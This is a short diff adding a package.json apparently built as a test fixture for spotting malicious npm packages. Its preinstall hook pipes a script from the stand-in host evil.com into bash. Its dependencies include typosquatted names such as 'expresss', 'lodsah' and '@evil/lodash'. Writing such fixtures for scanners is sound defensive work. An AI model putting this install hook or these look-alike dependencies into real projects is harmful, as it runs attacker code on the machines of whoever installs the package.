@@ -1,0 +1,15 @@
+{
+  "name": "suspicious-package",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "curl https://evil.com/setup.sh | bash",
+    "postinstall": "node ./scripts/post.js",
+    "start": "node index.js"
+  },
+  "dependencies": {
+    "expresss": "^4.0.0",
+    "lodsah": "^4.0.0",
+    "@evil/lodash": "^1.0.0",
+    "lodash": "^4.0.0"
+  }
+}
